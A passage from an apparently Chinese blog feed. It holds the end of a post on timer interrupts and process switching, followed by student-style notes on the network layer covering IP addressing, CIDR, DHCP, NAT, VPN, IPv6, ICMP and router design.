<h3 id="3-2-定时器中断"><a href="#3-2-定时器中断" class="headerlink" title="3.2. 定时器中断"></a>3.2. 定时器中断</h3><p>在实模式中，硬件<strong>定时器</strong>每隔55ms会发出一次中断请求，CPU接收到定时请求后，会转入8号定时器中断处理程序。</p>
<p>8号中断处理程序中，含有一条中断指令<code>int 1CH</code>，而1CH号中断处理程序并没有做任何工作，可以认为它只有一条中断返回指令。</p>
<p>如果我们将<code>1CH</code>中断处理程序设置为自定义的程序(将自定义程序的入口地址，填入中断向量表1CH*4地址处)，那么每过一段时间自定义程序便会被调用。</p>
<p>假如有主程序A和自定义的1CH中断处理程序B，那么A、B程序会相互切换执行，每过55ms执行B程序，然后中断返回执行A程序。</p>
<p>由于55ms肉眼无法察觉，所以我们会看到A、B程序同时运行的假象。</p>
<h3 id="3-3-浅析多进程并发"><a href="#3-3-浅析多进程并发" class="headerlink" title="3.3. 浅析多进程并发"></a>3.3. 浅析多进程并发</h3><p>现在，我们将主程序A看作<strong>操作系统</strong>，程序B看作<strong>进程切换程序</strong>。</p>
<p>那么，我们可以很明朗地发现，只要在程序B中，不断保存、恢复进程的上下文(进程的寄存器等)，就可以实现进程的切换。</p>
<p>每过55ms(或者更久)执行程序B，切换运行进程，并跳转到切换后的进程执行。从而实现多进程并发运行。</p>
<p>到这，是不是觉得并发竟然如此简单呢？</p>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>计算机系统</category>
      </categories>
      <tags>
        <tag>计算机系统</tag>
      </tags>
  </entry>
  <entry>
    <title>《计算机网络》笔记-第4/5章网络层</title>
    <url>/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82.html</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>综合第4章与第5章的网络层，以及课上老师所讲内容，与书本有较大不同。</p>
<p>在上一章中，曾提到运输层解决了进程间的通信问题。那么，网络层则解决了<strong>主机间的通信问题</strong>。</p>
<p>在偌大的互联网上，网络层会选择一条最短路径，将源主机的数据，经过一步步的转发，交付给目的主机。</p>
<p>而这个过程，就像现在的<strong>物流寄件</strong>，我们要如何将一份邮件或物品从发件地址邮寄到收件地址。</p>
<span id="more"></span>

<h2 id="1-网络层概述"><a href="#1-网络层概述" class="headerlink" title="1. 网络层概述"></a>1. 网络层概述</h2><p>网络层的主要协议为：<strong>IP协议</strong>。</p>
<p>网络层传输单元为：<strong>数据报</strong>。</p>
<p>网络层主要有两种功能：</p>
<ul>
<li><strong>转发</strong>：<ul>
<li>属于<strong>网络层数据平面</strong>。</li>
<li>将分组从一个数据报从输入链路转发到输出链路，由路由器完成，时间尺度短，通常用硬件实现。</li>
<li>类似于通过一个物流站点。</li>
<li>传统的方法：<strong>基于目的地转发</strong>（IP转发）；现代的方法：通用转发。</li>
</ul>
</li>
<li><strong>路由选择</strong>：<ul>
<li>属于<strong>网络层控制平面</strong>。</li>
<li>决定端到端的路径，时间尺度长，通常用软件实现。</li>
<li>类似于邮件从深圳到北京的行程规划。</li>
<li>传统的方法：<strong>路由选择算法</strong>；现代的方法：SDN（软件定义网络）。</li>
</ul>
</li>
</ul>
<h2 id="2-网际协议-IP-及其相关"><a href="#2-网际协议-IP-及其相关" class="headerlink" title="2. 网际协议 IP 及其相关"></a>2. 网际协议 IP 及其相关</h2><p>在进行转发和路由选择之前，我们必须解决一个重要问题：<strong>如何标识一台主机？</strong></p>
<p>主机的标识就像<strong>邮寄单上的收件地址</strong>一样。只有当每个主机的标识唯一时，才能将数据准确地交付到目的地。</p>
<p>而这，就是IP协议中IP地址的作用。</p>
<h3 id="2-1-IPv4-编址"><a href="#2-1-IPv4-编址" class="headerlink" title="2.1. IPv4 编址"></a>2.1. IPv4 编址</h3><h4 id="2-1-1-接口"><a href="#2-1-1-接口" class="headerlink" title="2.1.1. 接口"></a>2.1.1. 接口</h4><p>主机与物理链路之间的边界叫做<strong>网络接口（Interface，也叫网卡）</strong>。</p>
<p>主机通常只有一个网络接口（也可能是两个：有线网接口和无线网接口）；而路由器由于是不同网络间的交接中心，所以路由器至少需要与两条网络链路相连，因此路由器拥有多个网络接口。</p>
<p><strong>从技术上讲，一个IP地址与一个网络接口（网卡）相关联，而不是主机或路由器（可能是方便网络管理）</strong>。比如：路由器通常有内网接口和公网接口，而内网接口和公网接口的IP地址是不相同的。</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/5.png" alt="pic"></p>
<h4 id="2-1-2-点分十进制记法"><a href="#2-1-2-点分十进制记法" class="headerlink" title="2.1.2. 点分十进制记法"></a>2.1.2. 点分十进制记法</h4><p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/4.png" alt="pic"></p>
<h3 id="2-2-划分网络"><a href="#2-2-划分网络" class="headerlink" title="2.2. 划分网络"></a>2.2. 划分网络</h3><p>为了方便IP地址分类管理，我们通常将一定数量的主机组成一个<strong>子网 &#x2F; 网络</strong>。</p>
<p>其好处是：</p>
<ul>
<li><p><strong>方便子网内部管理</strong>。每个子网可以自由决定所使用的链路层网络、路由算法等。</p>
</li>
<li><p>网络一般通过一个路由器与其它网络相连，当路由器要转发IP数据报时，只要将数据报转发到所属的网络即可，再由所属的网络进行分发，<strong>使得路由器的转发工作更加简单</strong>。我们可以类比 <strong>邮编地址</strong>：南京市每个区都有特定的邮编地址，组成起来，就是南京市邮编地址的“网络”。<strong>若要转发 目的地为南京市江宁区 的邮件，我们可以先将它转发给南京市，再由南京市内部进行分发</strong>。</p>
</li>
</ul>
<p>那么如何来划分网络呢？从古至今，经过了三步发展：</p>
<ul>
<li><strong>分类的 IP 地址</strong>。</li>
<li><strong>子网的划分</strong>。</li>
<li><strong>无分类编址方法 CIDR</strong>。</li>
</ul>
<h4 id="2-2-1-分类的-IP-地址"><a href="#2-2-1-分类的-IP-地址" class="headerlink" title="2.2.1. 分类的 IP 地址"></a>2.2.1. 分类的 IP 地址</h4><p>将IP地址划分为<strong>网络号</strong>和<strong>主机号</strong>。网络号用于标识网络，主机号用于标识网络中的主机。</p>
<p>如果两个IP地址的网络号部分相同，则说明它们都属于同一个网络。</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/6.png" alt="pic"></p>
<p>总共有 A、B、C、D、E 五种分类方法。A 类常用于大型网络，B 类常用于中型，C 类则用于小型，D、E 类特殊用途。</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/7.png" alt="pic"><br><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/8.png" alt="pic"></p>
<p>注：网络号不能全为0，所以A类网络的网络数需要减多一个 1 ；主机号不能全为0，也不能全为1，所以C类网络中主机数为 $2^8-2 &#x3D; 254$。</p>
<p>以下是分类 IP 地址的一些示例：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/10.png" alt="pic"></p>
<h4 id="2-2-2-划分子网"><a href="#2-2-2-划分子网" class="headerlink" title="2.2.2. 划分子网"></a>2.2.2. 划分子网</h4><p>由于分类的 IP 地址中，某类网络所拥有的主机数是固定的，所以有时候会觉得C类地址中主机数太少，有时候又会觉得B类地址中主机数太多。</p>
<p>为此，又提出从主机号中划分出子网号，使得两级 IP 地址变成了三级 IP 地址。而且，子网号的长度是可变的：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/9.png" alt="pic"></p>
<p>但新的问题出现了，由于子网号可变，那如何从一个IP地址中区分出子网号呢？</p>
<p><strong>子网掩码！子网掩码长度为32位，左边连续且全为 1 的部分对应网络号和子网号，右边连续且全为 0 的部分对应主机号</strong>。当用子网掩码与 IP 地址进行 <strong>与运算</strong> 后，便可以得到子网号。</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/11.png" alt="pic"></p>
<p>另外，子网掩码是由子网提供的，并会记录在路由器的路由表中：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/12.png" alt="pic"></p>
<h4 id="2-2-3-无分类编址-CIDR"><a href="#2-2-3-无分类编址-CIDR" class="headerlink" title="2.2.3. 无分类编址 CIDR"></a>2.2.3. 无分类编址 CIDR</h4><p>随着时代的发展，人们发现了更好的 <strong>无分类域间路由选择 CIDR</strong> 方法。</p>
<ul>
<li>它消除了传统的A、B、C类地址和划分子网的概念；</li>
<li>采用变长的子网掩码，可以灵活地分配网络号；</li>
<li>并且网络可以进行嵌套；</li>
<li>IP 地址也从三级编址回到了两级编址。</li>
</ul>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/13.png" alt="pic"></p>
<p>补充说明：</p>
<ul>
<li>CIDR 中，<strong>网络前缀</strong>相当于此前的网络号，只是现在的网络号是变长的；</li>
<li>CIDR 采用 <strong>a.b.c.d&#x2F;x</strong> 的记法来表示 IP 地址，斜杠 <code>/</code> 之后的 <code>x</code> 表示子网掩码中 1 的个数，用来指明网络前缀的长度。</li>
</ul>
<p>CIDR 实践：</p>
<ul>
<li><strong>路由聚合（route aggregation）</strong>。如下图，<code>Fly-By-Night-ISP</code> 内部有 8 个自组织，每个组织都有自己的子网。通过 CIDR 编址，外界只需要将所有 IP 地址前 20 比特与 <code>200.23.16.0/20</code> 相符的数据报，发送到该 ISP 即可，而不需要知道该 ISP 内还存在 8 个其它组织。</li>
</ul>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/14.png" alt="pic"></p>
<ul>
<li><strong>最长前缀匹配</strong>。使用 CIDR 时，路由器路由表的每一项由网络前缀和对应的输出链路组成。当根据 IP 地址查找路由表时，可能会匹配多个网络前缀，则应当从匹配结果中选出最长的网络前缀。</li>
</ul>
<h3 id="2-3-IPv4-数据报格式"><a href="#2-3-IPv4-数据报格式" class="headerlink" title="2.3. IPv4 数据报格式"></a>2.3. IPv4 数据报格式</h3><p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/1.png" alt="pic"></p>
<ul>
<li>版本：IP协议版本。</li>
<li>首部长度：大多数IP数据报的首部不包含可变部分，所以<strong>一般的IP数据报首部长度为20字节</strong>。</li>
<li>服务类型（区分服务）：将用于不同服务的IP数据报区分开来。例如，将实时数据报（IP电话应用）和非实时数据报（FTP）区分。</li>
<li>数据报长度（总长度）：整个IP数据报长度，以字节为单位。16位，理论上最大长度为65535字节，但受限于链路层最大帧长度MTU，<strong>一般不超过1500字节</strong>。</li>
<li>标识、标志、片偏移：这三个字段与<strong>IP分片</strong>有关，将马上讨论。</li>
<li><strong>寿命（TTL，生存时间）</strong>：用来保证数据报不会永远在网络中死循环，每经过一台路由器时，该字段的值减1，若减为0，则该数据报必须丢弃。</li>
<li>协议：指定交给哪个<strong>运输层协议</strong>。</li>
<li>首部校验和：用于检测数据报首部是否出现比特差错。</li>
<li><strong>源和目的IP地址</strong>：用于标识源主机IP，和目的主机IP。</li>
<li>可变部分：通常没被使用。</li>
<li>数据：可以是要交付给目的地的运输层报文段，也可以是其它类型数据，比如ICMP报文。</li>
</ul>
<h3 id="2-4-IPv4-数据报分片"><a href="#2-4-IPv4-数据报分片" class="headerlink" title="2.4. IPv4 数据报分片"></a>2.4. IPv4 数据报分片</h3><p>受限于 <strong>链路层最大帧长度 MTU</strong> 影响（以太网帧不能超过1500字节、某些广域网链路不能超过576字节），IP 数据报过大时，需要对 IP 数据报进行分片：将原数据报中的数据部分分成恰好的几部分，对每一部分数据都加上 IP 首部，组成几个新的 IP 数据报。</p>
<p>IP 数据报分片依托于首部的<strong>标识</strong>、<strong>标志</strong>、<strong>片偏移</strong>字段：</p>
<ul>
<li><strong>标识</strong>：产生 IP 数据报的标识，用于区分不同的分片数据报，是属于哪个原始数据报。</li>
<li><strong>标志</strong>：3字节，目前只有后两位有意义，最低位是**MF(More Fragment)<strong>，中间位是</strong>DF(Don’t Fragment)**。<code>MF = 1</code> 表示后面还有分片，<code>MF = 0</code> 表示最后一个分片，<code>DF = 0</code> 表示允许分片。</li>
<li><strong>片偏移</strong>：表示这个分片在原始数据报中的位置，以8字节为单位。</li>
</ul>
<p>示例：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/2.png" alt="pic"><br><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/3.png" alt="pic"></p>
<p><strong>注意：在第3章中提到，TCP为了防止IP分片，会先一步进行分段。</strong></p>
<h3 id="2-5-DHCP"><a href="#2-5-DHCP" class="headerlink" title="2.5. DHCP"></a>2.5. DHCP</h3><p>我们知道，划分网络是为了各种各样的组织更好地管理网络。当某个组织（比如学校、公司等）申请入网后，相关机构会给组织分配一个子网络（也就是一系列IP地址），组织可以自由地分配这一些列IP地址。</p>
<p>从前，这项工作通常由组织的管理员手动为每台主机和路由器配置。但如今，更多的是使用 <strong>动态主机配置协议（Dynamic Host Configuration Protocol，DHCP）</strong> 来完成：</p>
<ul>
<li>DHCP 允许主机自动获取IP地址；</li>
<li>可以通过配置，使得同一台主机每次联网时，既能得到一个相同的IP地址，也可以被分配到一个临时的IP地址；</li>
<li>除了主机IP地址分配外，DHCP还会告知主机 子网掩码、默认网关、默认DNS 等信息。</li>
</ul>
<p>它也常常被称为<strong>即插即用协议</strong>或<strong>零配置协议</strong>。</p>
<p>DHCP 为联网主机分配IP地址的过程为：</p>
<ol>
<li><p><strong>DHCP 服务器发现</strong>：一台刚联网的主机，会向网络中发送一个 <strong>DHCP 发现报文（DHCP discover message）</strong>，这是一个由 67 号端口发送的 UDP 报文。该报文的 <strong>目的地址</strong> 为 <strong>255.255.255.255（IP 地址全 1 表示广播地址，会发送给当前子网络中的所有主机）</strong>，<strong>源地址</strong> 为 <strong>0.0.0.0（主机还不知道它的地址）</strong> 。</p>
</li>
<li><p><strong>DHCP 服务器提供</strong>：网络中的 DHCP 服务器收到一个 DHCP 发现报文后，会用 <strong>DHCP 提供报文（DHCP offer message）</strong> 进行响应。报文的目的地址依然是 <strong>255.255.255.255</strong>，但同时报文中包含对应 DHCP 发现报文的事务ID、向用户推荐的IP地址、网络掩码和IP地址有效期等。</p>
</li>
<li><p><strong>DHCP 请求</strong>：由于一个网络中可能存在多个 DHCP 服务器，用户会从多个 DHCP 提供报文中选择一个，并发送 <strong>DHCP 请求报文（DHCP request message）</strong> 响应对应的 DHCP 服务器（你就天选之子&gt;.&lt;）。</p>
</li>
<li><p><strong>DHCP ACK</strong>：DHCP 服务会对 DHCP 请求报文进行响应。</p>
</li>
</ol>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/15.png" alt="pic"></p>
<h3 id="2-6-NAT"><a href="#2-6-NAT" class="headerlink" title="2.6. NAT"></a>2.6. NAT</h3><p>从前面的介绍中，我们知道：<strong>每个联网设备都会分配一个唯一的IP地址</strong>。但是，随着互联网的爆发，入网设备激增，剩余 IP 地址越来越少。</p>
<p>同时，越来越多的小型子网（家庭网络、小型办公室）涌现。如果这些子网想要联网，ISP 则需要分配一组地址给该子网的所有联网设备。如果某天这个子网变大了，ISP 可能得分配一块较大的连续地址，但这组地址后的连续地址都被占有了，这该怎么办呢？ISP 管理这些子网显得十分繁琐。而且，家庭的主人还需要知道 IP 地址管理经典方法。</p>
<p>幸运的是，一个简单的方法被用来解决这个问题，那就是 <strong>网络地址转换（Network Address Translation, NAT）</strong> ——它将这些子网指定为专用网络，专用网络中可以自主分配专用地址。</p>
<p>在介绍 NAT 之前，不知道细心的同学们有没有发现一个现象：不管你电脑连接的是家庭网络、学校网络、还是手机热点，电脑的 IP 地址经常都是 <code>192.168.x.x</code> ，甚至有时候还是相同的。</p>
<p>为什么会这么巧呢？这就是 NAT 在背后作祟。</p>
<p>以家庭网络为例：</p>
<ul>
<li>每个家庭都会有至少一个路由器，与路由器相连的家庭设备都处于<strong>同一个子网</strong>中，这个子网就是私有网络（也可以称作<strong>内网&#x2F;LAN</strong>）。</li>
<li>而路由器另一端所连接的互联网，通常称为<strong>公网&#x2F;WAN</strong>。</li>
<li>因此，路由器拥有两个 IP 地址（一个网络接口对应一个 IP 地址），内网 IP 和公网 IP 。</li>
<li>NAT 则被设置在这台路由器上。当内网设备访问公网的数据报经过这台 NAT 路由器时，<strong>NAT 路由器会将数据报中的源 IP 地址改成自己的公网 IP 地址，以及将源端口号更改为自己的端口号</strong>，并把映射关系记录在 <strong>NAT 转换表</strong> 上。</li>
<li>当收到公网的响应数据报时，NAT 路由器会<strong>从 NAT 转换表上找映射关系</strong>，这次则<strong>将数据报中的目的 IP 地址和目的端口号，改为对应内网主机的 IP 地址和端口号</strong>。</li>
</ul>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/16.png" alt="pic"></p>
<p>在外界看来，NAT 路由器就像一个具有单一 IP 地址的单一设备，它<strong>隐藏了家庭网络的细节</strong>。所有离开家庭网络流向公网的报文都拥有同一个源 IP 地址，而所有进入家庭网络的报文都拥有同一个目的 IP 地址。</p>
<p>凭借着 NAT 协议，N 个主机可以拥有任意内网 IP ，而在外界看来就只有一个公网 IP 地址（由于端口号字段为 16 比特，所以 <strong>NAT 路由器可支持超过 60000 个的连接</strong>）。如此往后，ISP 再也不用操心子网 IP 地址分配的问题，家庭子网的主人也不需要掌握管理子网的方法了，这都可以由家庭路由器统一自动分配管理。</p>
<p>虽然 NAT 既简单又好用，但也存在着几个问题：</p>
<ol>
<li><strong>内网 IP 与公网 IP 冲突问题</strong>。</li>
</ol>
<p>  由于内网中所有的 IP 地址经过 NAT 路由器后，都会变成 NAT 路由器的公网 IP 地址，所以内网中的 IP 地址可以任意分配。但是，如果一个 IP 地址即存在于内网又存在于公网，NAT 路由器要如何转发呢？</p>
<p>  为了避免这个矛盾的出现，**互联网规定三类 IP 地址块（地址范围）为专用地址，只能用于专用网络（也就是内网）不能出现在公网上，分别是：<code>10.0.0.0 ~ 10.255.255.255</code>、<code>172.16.0.0 ~ 172.31.255.255</code>、<code>192.168.0.0 ~ 192.168.255.255</code>**（所以，我们经常见到电脑的 IP 地址为 <code>192.168.x.x</code> ，其实这就是一个内网 IP ）。</p>
<ol start="2">
<li><strong>内网IP无法被外部主机访问</strong>。</li>
</ol>
<p>  由于 NAT 路由器把内网隐藏了，而且内网 IP 也不会出现在公网上。<strong>如果一台主机想要被外部主机访问，则需要申请公网 IP</strong>，而这只能向相关运营商购买。如果实在想访问内网主机，可以采用<strong>内网穿透</strong>等方法。</p>
<ol start="3">
<li><strong>路由器作为网络层设备，却修改应用层的端口号，不符合体系结构</strong>。</li>
</ol>
<p>  但随着 NAT 的流行，这种反对的声音也渐渐变小。</p>
<h3 id="2-7-VPN"><a href="#2-7-VPN" class="headerlink" title="2.7. VPN"></a>2.7. VPN</h3><p>上文提到，NAT 协议能够方便地管理专用网络，但其中一个问题就是专用网络（内网）中的主机是不可访问的。有些机构在使用 NAT 的同时，又想从外部访问内网的主机，那要怎么办呢？</p>
<p>申请公网 IP ？但问题是，机构申请到的公网 IP 数量往往是有限；而且由于互联网的不安全性，一个机构也不想把部分主机接入互联网。</p>
<p>为了解决从外部网络访问内网主机的问题，<strong>虚拟专用网络（Virtual Private Network，VPN）</strong> 被提出来了。说到 VPN ，很多老司机们应该再清楚不过了:) <strong>科学上网</strong>的必备工具，此刻我们就来见识一下 VPN 奥妙。</p>
<p>VPN 可以将相隔着公网的两个专用网络连接起来，就好像一个专用网络一样（实际上并不是），所以称为虚拟专用网络。那它是如何实现的呢？</p>
<ul>
<li><p>首先，购买 VPN 的机构，必须在通信的两端进行相关配置，相互之间必须知道对方的地址。</p>
</li>
<li><p>其次，专用网络之间的通信必须经过公网，为了保密要求，VPN 还必须对所有传输的数据进行加密。</p>
</li>
<li><p>最后，利用 <strong>隧道</strong> 技术进行传输。隧道技术其实就一个<strong>包装、拆包</strong>的过程：内网 A 中主机 X 发送给内网 B 中主机 Y 的数据报，到达出口路由器后，会将数据报进行加密，并<strong>再套上一个 IP 首部</strong>，以内网 B 中入口路由器的公网 IP 地址为目的地址；到达内网 B 的入口路由器后，会取出<strong>数据部分</strong>进行解密，并转发到内网，最终到达主机 Y 。</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/19.png" alt="pic"></p>
</li>
</ul>
<h3 id="2-8-IPv6"><a href="#2-8-IPv6" class="headerlink" title="2.8. IPv6"></a>2.8. IPv6</h3><p>虽然 NAT 一定程度上也扩充了互联网中联网设备的容量，但公网 IP 的数量还是受 IPv4 地址的限制，IPv4 地址只有 32 位，总共才 $4,294,967,295 \approx 4.2 \times 10^9 \approx 42亿$ 个。随着互联网惊人的增长，公网 IP 也即将耗尽。</p>
<p>为了避免耗尽情况的出现，一种新的 IP 协议被提出——IPv6。</p>
<p><strong>IPv6 将 IP 地址长度从 32 比特增加到了 128 比特</strong>。现在，地球上的每个沙砾都可以用 IP 地址寻址了。</p>
<p><strong>IPv6 数据报格式</strong>如下：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/17.png" alt="pic"></p>
<p>其最重要的几大<strong>新增改变</strong>如下：</p>
<ul>
<li>首先，<strong>扩大的地址容量</strong>，IP 地址从32位比特增加到128比特。</li>
<li>其次，<strong>首部简化为40字节</strong>。</li>
<li>同时，提供<strong>流</strong>服务，流是提供某些特殊服务所使用的，比如音频视频等。</li>
</ul>
<p>但几个 IPv4 中的字段和功能在 IPv6 数据报中也<strong>不复存在</strong>了：</p>
<ul>
<li><strong>取消分片</strong>。IPv6 不允许在中间路由器上进行分片与重新组装，这种操作只能在源和目的地执行。如果路由器收到的 IPv6 数据报因太大而不能转发到输出链路上的话，路由器会丢弃该数据报，并向发送方发送一个“分组太大”的 ICMP 差错报文。于是，发送方将使用较小长度的 IP 数据报重发。</li>
<li><strong>删除首部校验和字段</strong>。由于运输层和数据链路层协议中都包含了校验操作，所以 IP 设计者觉得网络层再具有该功能实属多余。</li>
<li><strong>删除选项字段</strong>。IPv6 首部中，选项字段已经不复存在了。但它并没有消失，而是可能出现在 IPv6 首部的“下一个首部”字段所指出的位置上。当然，通常情况下，“下一个首部”字段指的是 TCP 或 UDP 首部。</li>
</ul>
<p>虽然 IPv6 被设计出来，但已部署 IPv4 的系统却不能够处理 IPv6 数据报，如何从 IPv4 迁移到 IPv6 是当下的大问题。</p>
<p>其中一个迁移方法便是 <strong>建隧道（tunneling）</strong>：</p>
<p>假设两个 IPv6 节点使用 IPv6 数据报进行交互，中间经过 IPv4 路由器，那么我们可以把中间 IPv4 路由器的集合称为一个 <strong>隧道</strong>。当 IPv6 数据报要进入隧道时，可以用 IPv4 数据报<strong>包裹</strong>起来，出隧道时，再取出。其过程如下：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/18.png" alt="pic"></p>
<h3 id="2-9-ICMP"><a href="#2-9-ICMP" class="headerlink" title="2.9. ICMP"></a>2.9. ICMP</h3><p>在上文中提到，ICMP 报文可以被 IPv6 用来告知发送方数据报过大，但ICMP的作用不止于此。</p>
<p>**因特网控制报文协议 ICMP [RFC 792]**，被主机和路由器用来彼此沟通网络层信息的协议。</p>
<p>其报文格式如下：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/20.png" alt="pic"></p>
<p>由图可知，ICMP 报文类似于 TCP、UDP ，它也是被 IP 数据报所包裹的。</p>
<p>根据首部<strong>类型</strong>字段和<strong>代码</strong>字段的不同，ICMP 报文有着不同的功能，常见的如下：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/21.png" alt="pic"></p>
<p>ICMP 最贴近我们的应用，便是 <strong>ping</strong> 程序和 <strong>Traceroute</strong> 程序了。众所周知的 ping 程序便是发送一个类型 8 编码 0 的 ICMP 报文，目的主机返回一个类型 0 编码 0 的 ICMP 响应报文。</p>
<p>Windows 下实验 traceroute，打开 cmd ，输入指令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; tracert baidu.com</span><br></pre></td></tr></table></figure>

<h2 id="3-路由器结构与转发"><a href="#3-路由器结构与转发" class="headerlink" title="3. 路由器结构与转发"></a>3. 路由器结构与转发</h2><p>路由器是网络层中重要的设备。它用于<strong>连接不同的网络</strong>，并在不同网络间<strong>转发分组</strong>，同时也具备<strong>路由选择</strong>的功能。</p>
<p>路由器结构如下：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/22.png" alt="pic"></p>
<ul>
<li><p><strong>输入端口</strong>。输入端口包含物理层、链路层、网络层处理模块。物理层模块负责接收处理物理信号；链路层模块负责去掉帧首部和尾部；网络层模块负责进行查表、转发、排队进入交换结构。</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/23.png" alt="pic"></p>
<p>其中，<strong>查表和转发</strong>是输入端口的核心功能。</p>
<ul>
<li>以传统的<strong>基于目的地转发</strong>为例：查表主要是根据分组目的地址的<strong>前缀</strong>，在<strong>转发表</strong>（由路由选择处理器提供，可以看作路由表）中查找匹配项（此处会用到前面提到的<strong>最长前缀匹配规则</strong>）；转发则是根据查表结果，将分组送入交换结构中，转发到对应输出链路；如果交换结构正繁忙，分组还需要排队等候。</li>
<li>而更高级的<strong>通用转发</strong>，则采用“匹配加动作”的抽象方式。</li>
</ul>
</li>
